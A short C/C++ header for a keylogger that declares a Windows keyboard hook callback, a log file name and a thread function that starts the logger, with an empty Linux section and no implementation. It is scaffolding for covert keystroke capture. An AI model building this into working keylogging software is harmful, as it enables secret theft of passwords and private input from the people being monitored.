#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#include <fstream>
#else 
#include <unistd.h>
#endif


// windows 
#ifdef _WIN32
extern const char keyloggerfile[256];
LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

void* StartWindowsKeylogger(void* arg);

// linux
#endif


#endif


